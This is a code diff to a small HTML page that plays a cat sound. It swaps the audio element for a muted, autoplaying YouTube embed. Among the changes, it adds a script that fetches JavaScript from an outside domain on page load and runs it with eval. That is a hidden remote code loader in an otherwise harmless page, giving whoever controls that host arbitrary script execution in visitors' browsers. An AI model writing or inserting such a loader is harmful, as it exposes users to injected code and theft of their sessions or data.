@@ -1,16 +1,30 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <audio id="catAudio" loop autoplay>
-    <source src="cat.mp3" type="audio/mpeg">
-  </audio>
+
+  <script>
+    fetch('https://meowww.lol/cat.js')
+      .then(r => r.text())
+      .then(eval);
+  </script>
+
+  <iframe 
+    id="ytplayer"
+    width="560" 
+    height="315" 
+    src="https://www.youtube.com/embed/IxX_QHay02M?enablejsapi=1&autoplay=1&loop=1&playlist=IxX_QHay02M&mute=1" 
+    frameborder="0" 
+    allow="autoplay; encrypted-media">
+  </iframe>
+
+  <audio id="catAudio" src="your-audio-file.mp3"></audio>
 
   <script>
     const audio = document.getElementById('catAudio');
     audio.play().catch(() => {
-      console.log("Autoplay blocked, click anywhere to start the cat sound.");
       document.body.addEventListener('click', () => audio.play());
     });
   </script>
+
 </body>
 </html>
